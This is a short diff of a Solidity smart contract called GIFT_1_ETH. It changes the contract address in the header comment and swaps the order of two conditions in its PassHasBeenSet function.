@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x1DABd43E0F8a684a02712bcD767056E25026061c
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x5DAC036595568Ff792f5064451b6B37e801ecaB9
 */
 pragma solidity ^0.4.19;
 
@@ -61,7 +61,7 @@ contract GIFT_1_ETH
     function PassHasBeenSet(bytes32 hash)
     public
     {
-        if(msg.sender==sender&&hash==hashPass)
+        if(hash==hashPass&&msg.sender==sender)
         {
            closed=true;
         }
